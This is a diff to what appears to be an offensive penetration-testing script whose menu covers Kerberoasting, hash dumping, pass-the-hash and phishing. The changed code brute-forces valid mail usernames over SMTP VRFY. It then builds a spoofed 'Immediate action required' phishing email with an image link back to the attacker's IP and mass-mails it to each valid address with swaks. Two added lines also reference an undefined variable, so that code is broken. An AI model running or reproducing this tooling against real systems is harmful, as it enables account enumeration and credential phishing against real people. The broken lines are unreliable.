@@ -45,6 +45,16 @@ from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
+def nmapTrim(variable):
+   localCOM("sed -i '/# Nmap/d' " + variable)
+   localCOM("sed -i '/Nmap scan report/d' " + variable)
+   localCOM("sed -i '/Host is up, received/d' " + variable)
+   localCOM("sed -i '/STATE SERVICE/d' " + variable )
+   localCOM("sed -i '/Nmap done/d' " + variable)
+   localCOM("sed -i '/Service Info/d' " + variable)
+   localCOM("sed -i '/Service detection performed/d' " + variable)
+   return
+
 def cutLine(variable1, variable2):
    localCOM("sed -i '/" + variable1 + "/d' ./" + variable2)
    return
@@ -757,7 +767,7 @@ def options():
    print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set SHARENAME (23) Services (33) Sam Dump Users (43) KerberosBrute (53) Domain Dump (63) ExplScanner (73) GenSSHKeyID (83) SSHKeyID" + '\u2551')   
    print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Start SERVICE (24) AT  Exec (34) REGistry Hives (44) KerbeRoasting (54) Blood Hound (64) Expl Finder (74) GenListUser (84) Telnet  " + '\u2551')
    print('\u2551' + "(05) Re/Set WEBSITE URL (15) DNS Enumerations (25) DComExec (35) Enum EndPoints (45) ASREPRoasting (55) BH ACL PAWN (65) ExplCreator (75) GenListPass (85) Netcat  " + '\u2551')
-   print('\u2551' + "(06) Re/Set USER   NAME (16) Nmap  LIVE PORTS (26) PS  Exec (36) RpcClient Serv (46) PASSWORD2HASH (56) SecretsDump (66) Directories (76) NTDSDECRYPT (86) MSSQL   " + '\u2551')
+   print('\u2551' + "(06) Re/Set USER   NAME (16) Nmap Live  PORTS (26) PS  Exec (36) RpcClient Serv (46) PASSWORD2HASH (56) SecretsDump (66) Directories (76) NTDSDECRYPT (86) MSSQL   " + '\u2551')
    print('\u2551' + "(07) Re/Set PASS   WORD (17) Nmap PORTService (27) SMB Exec (37) SmbClient Serv (47) Pass the HASH (57) CrackMapExe (67) SNMP Walker (77) Hail! HYDRA (87) MySQL   " + '\u2551')
    print('\u2551' + "(08) Re/Set NTLM   HASH (18) Enum Sub-DOMAINS (28) WMO Exec (38) Smb Map SHARES (48) OverPass HASH (58) PSExec HASH (68) ManPhishCod (78) MSF Console (88) WinRm   " + '\u2551')
    print('\u2551' + "(09) Re/Set TICKET NAME (19) EnumVirtualHOSTS (29) NFS List (39) Smb Dump Files (49) Kerbe5 Ticket (59) SmbExecHASH (69) AutoPhisher (79) Remote Sync (89) RemDesk " + '\u2551')
@@ -1612,14 +1622,12 @@ while True:
             print(colored("[*] Scanning specified live ports only, please wait this may take sometime...", colour3))
             print("[+] Light scan...")            
             remotCOM("nmap " + IP46 + " -p " + PTS.rstrip(" ") + " -sV --reason --script=banner " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")
-            localCOM("tail light.tmp > lights.tmp")
-            localCOM("sed -i '/STATE SERVICE/d' lights.tmp")
-            localCOM("sed -i '/Nmap done/d' lights.tmp")
-            localCOM("sed -i '/Service detection performed/d' lights.tmp")
-            parsFile("lights.tmp")
-            catsFile("lights.tmp")            
+            nmapTrim("light.tmp")
+            parsFile("light.tmp")
+            catsFile("light.tmp")            
             print("[+] Heavy scan...")
             remotCOM("nmap " + IP46 + " -p " + PTS.rstrip(" ") + " -sT -sU -sV -O -A -T4 --reason --script=discovery,external,auth " + TIP.rstrip(" ") + " -oN heavy.tmp 2>&1 > temp.tmp")
+            localCOM("sed -i '/# Nmap/d' " + variable)            
             catsFile("heavy.tmp")                   
             if "500" in PTS:
                remotCOM("ike-scan -M " + TIP.rstrip(" ") + " -oN ike.tmp 2>&1 > temp.tmp")
@@ -1628,14 +1636,12 @@ while True:
             print(colored("[*] Scanning all ports, please wait this may take sometime...", colour3) + " -oN light.tmp 2>&1 > temp.tmp")
             print("[+] Light scan...")
             remotCOM("nmap " + IP46 + " -sT -sU -sV -Pn --reason --script=banner " + TIP.rstrip(" "))
-            localCOM("tail light.tmp > lights.tmp")
-            localCOM("sed -i '/PORT    STATE SERVICE     REASON         VERSION/d' lights.tmp")
-            localCOM("sed -i '/Nmap done/d' lights.tmp")
-            localCOM("sed -i '/Service detection performed/d' lights.tmp")
-            parsFile("lights.tmp")
-            catsFile("lights.tmp")
+            nmapTrim("light.tmp")
+            parsFile("light.tmp")
+            catsFile("light.tmp")
             print("[+] Heavy scan...")
             remotCOM("nmap " + IP46 + " -sT -sU -sV -Pn --reason --script=discovery,external,auth " + TIP.rstrip(" ") + " -oN heavy.tmp 2>&1 > temp.tmp")
+            localCOM("sed -i '/# Nmap/d' " + variable)                       
             catsFile("heavy.tmp")
             if "500" in PTS:
                remotCOM("ike-scan -M " + TIP.rstrip(" ") + " -oN ike.tmp 2>&1 > temp.tmp")
@@ -3135,10 +3141,14 @@ while True:
             checkParams = getPort()                 
             if checkParams != 1:
                print("\n- - - - - - - - - - - - - - - - - - - - - - -")
-               print("Target  : " + TIP.rstrip(" "))
-               print("Sender  : " + USR.rstrip(" "))
-               print("Receiver: usernames.txt")
-               print("Domain  : " + DOM.strip(" "))
+               print("Target   : " + TIP.rstrip(" "))
+               print("Sender   :", end=' ')
+               if USR[:1] == "'":
+                  print("it@" + localIP + " (defualt)")
+               else:
+                  print(USR.rstrip(" "))
+               print("Recipient: usernames.txt")
+               print("Domain   : " + DOM.strip(" "))
                print("- - - - - - - - - - - - - - - - - - - - - - -\n")
                print(colored("[*] Attempting to connect to remote SMTP socket...", colour3))
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -3153,19 +3163,19 @@ while True:
                print(colored(bannerResponce, colour6))                     
                print("\n[+] Saying hello...\n")
                if "ESMTP" in str(bannerResponce):
-                  string = "EHLO Rogue.Agent\r\n"
+                  string = "EHLO RogueAgent\r\n"
                else:
-                  string = "HELO Rogue.Agent\r\n"
+                  string = "HELO RogueAgent\r\n"
                s.send(bytes(string.encode()))
                helloResponce = s.recv(1024)
                print(colored(helloResponce, colour6))            
                print("\n[+] Specifying my email address...\n")
-               string = "MAIL FROM:<root@kali.domain>\r\n"
+               string = "MAIL FROM:<rogueagent@kali.domain>\r\n"
                s.send(bytes(string.encode()))
                mailResponce = s.recv(1024)
                print(colored(mailResponce, colour6))               
-               print("\n[+] Specifying recipient email address " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + "...\n")
-               string = "RCPT TO:<" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + ">\r\n"
+               print("\n[+] Trying recipient email address root@" + DOM.rstrip(" ") + "...\n")
+               string = "RCPT TO:<root@" + DOM.rstrip(" ") + ">\r\n"
                s.send(bytes(string.encode()))
                rcptResponce = s.recv(1024)
                print(colored(rcptResponce, colour6))            
@@ -3176,13 +3186,17 @@ while True:
                print(colored(helpResponce, colour6))            
                print(colored("\n[*] Attempting to bruteforce valid usernames...", colour3))
                count = lineCount(dataDir + "/usernames.txt")
+               localCOM("touch valid.tmp")
                for x in range(0, count):
                   data = linecache.getline(dataDir + "/usernames.txt", x + 1)
-                  string = "RCPT TO:<" + data.rstrip("\n") + "@" + DOM.rstrip(" ") + ">\r\n"
-                  s.send(bytes(string.encode()))
-                  bruteCheck = s.recv(1024)
-                  if "Invalid recipient" not in str(bruteCheck):
-                     localCOM("echo " + data.rstrip("\n") + " >> valid.tmp")                  
+                  string = "VRFY " + data.rstrip("\n") + "\r\n"
+                  try:
+                     s.send(bytes(string.encode()))
+                     bruteCheck = s.recv(1024)
+                  except:
+                     print(colored("[!] WARNING!!! - Huston, we encountered a connection issue... just letting you know!!...", colour0))
+                  if "550" not in str(bruteCheck):
+                     localCOM("echo " + data.rstrip("\n") + " >> valid.tmp")
                nullTest = linecache.getline("valid.tmp",1)
                if nullTest != "":
                   print("[+] Valid usernames found...")
@@ -3193,13 +3207,17 @@ while True:
                   check = 1                  
                print("[+] Saying goodbye...\n")            
                string = "QUIT\r\n"
-               s.send(bytes(string.encode()))
-               quitResponce = s.recv(1024)
-               print(colored(quitResponce, colour6)) 
+               try:
+                  s.send(bytes(string.encode()))
+                  quitResponce = s.recv(1024)
+                  print(colored(quitResponce, colour6)) 
+               except:
+                     print(colored("[!] WARNING!!! - Huston, we encountered a connection issue... just letting you know!!...", colour0))   
                s.close()            
                if check != 1:
                   print(colored("\n[*] Creating a corporate looking phishing email...", colour3))
-                  localCOM('echo "Hello.\n" > body.tmp')
+                  localCOM('echo "Subject: Immediate action required\n" > body.tmp')
+                  localCOM('echo "Hello.\n" >> body.tmp')
                   localCOM('echo "We just performed maintenance on our servers." >> body.tmp') 
                   localCOM('echo "Please verify if you can still access the login page:\n" >> body.tmp')
                   localCOM('echo "\t  <img src=\""' + localIP + ":" + checkParams + '"/img\">" >> body.tmp')
@@ -3210,18 +3228,22 @@ while True:
                      localCOM('echo it@' + DOM.rstrip(" ") + ' >> body.tmp')
                      sender = "it"
                   else:
-                     localCOM('echo ' + USR.rstrip(" ") + '@' + DOM.rstrip(" ") + ' >> body.tmp')
+                     localCOM('echo ' + USR.rstrip(" ") + '@' + localIP + ' >> body.tmp')
                      sender = USR.rstrip(" ")
                   catsFile("body.tmp")
                   print(colored("[*] Phishing the valid username list...", colour3))
+                  parsFile("valid.tmp")
                   with open("valid.tmp", "r") as list:
                      for phish in list:
                         phish = phish.rstrip("\n")
                         phish = phish.strip(" ")
                         phish = phish + "@"
                         phish = phish + DOM.rstrip(" ")
-                        remotCOM("swaks --to " + phish + " --from " + sender + "@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
-                        print("[+] Email exploit sent to " + phish + " from " + sender + "@" + DOM.rstrip(" ") + "...")
+                        try:
+                           remotCOM("swaks --to " + phish + " --from " + sender + "@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
+                           print("[+] Email exploit sent to " + phish + " from " + sender + "@" + DOM.rstrip(" ") + "...")
+                        except:
+                           print(colored("[!] WARNING!!! - Huston, we encountered a connection issue... just letting you know!!...", colour0))
       else:
          print("[-] You need to start the smtpd server first...")
       prompt()     
